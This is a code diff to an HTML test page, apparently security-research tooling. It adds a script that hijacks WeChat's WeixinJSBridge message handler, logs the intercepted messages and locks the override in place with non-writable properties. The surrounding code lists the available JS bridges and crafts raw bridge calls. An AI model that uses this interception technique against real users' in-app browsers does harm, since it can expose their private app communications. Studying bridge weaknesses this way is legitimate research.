@@ -9,6 +9,26 @@
 		  	}
 		}
 	</script>
+
+	<script>
+	function _handleMessageFromWeixin(message) {
+		mylog("hijacking");
+		mylog(message);    	
+    }
+    
+    Object.defineProperty(__WeixinJSBridge, '_handleMessageFromWeixin', {
+      value: _handleMessageFromWeixin,
+      writable: false,
+      configurable: false
+    });
+
+    Object.defineProperty(window, 'WeixinJSBridge', {
+      value: __WeixinJSBridge,
+      writable: false,
+      configurable: false
+    });  
+	</script>
+
 	<script>
   	window.addEventListener('load', function(event) {
   		mylog("[+] Printing Javascript-bridges available");
@@ -40,7 +60,7 @@
 				"__msg_type":"call",
 				"__callback_id":"1026"	
 			});
-			
+
 			var msgArray = []; msgArray.push(msg);
     		var msgArrayString = JSON.stringify(msgArray);
 
